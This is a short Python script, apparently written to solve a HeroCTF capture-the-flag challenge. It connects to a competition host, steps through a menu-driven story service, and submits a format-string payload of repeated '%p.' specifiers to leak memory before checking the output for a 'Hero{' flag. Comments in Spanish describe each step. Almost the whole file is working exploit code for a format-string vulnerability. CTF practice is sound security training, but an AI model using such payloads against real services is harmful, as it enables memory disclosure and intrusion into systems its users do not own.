#!/usr/bin/env python3
import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect(('dyn06.heroctf.fr', 13683))

def recv_until(s, text, max_bytes=4096):
    data = b''
    count = 0
    while text not in data and count < max_bytes:
        try:
            chunk = s.recv(1024)
            if not chunk:
                break
            data += chunk
            count += len(chunk)
            print(chunk.decode('utf-8', errors='ignore'), end='', flush=True)
        except socket.timeout:
            break
    return data.decode('utf-8', errors='ignore')

try:
    recv_until(s, b'> ', 500)
    
    # Submit story
    s.send(b'1\n')
    recv_until(s, b': ', 500)
    
    s.send(b'64\n')
    recv_until(s, b': ', 500)
    
    # Format string para leak memoria
    story = b'%p.' * 20
    s.send(story + b'\n')
    time.sleep(1)
    recv_until(s, b'> ', 2000)
    
    # Ver última historia (que podría tener format string)
    s.send(b'2\n')
    time.sleep(1)
    result = recv_until(s, b'> ', 2000)
    
    # Ver info del jurado (que muestra jury_gift con %p)
    s.send(b'3\n')
    time.sleep(1)
    info = recv_until(s, b'> ', 2000)
    
    # Ver resultados
    s.send(b'4\n')
    time.sleep(1)
    results = recv_until(s, b'> ', 2000)
    
    if 'Hero{' in results or 'Hero{' in info:
        print("\n*** FLAG FOUND ***")
    
except Exception as e:
    print(f"\nError: {e}")
finally:
    s.close()
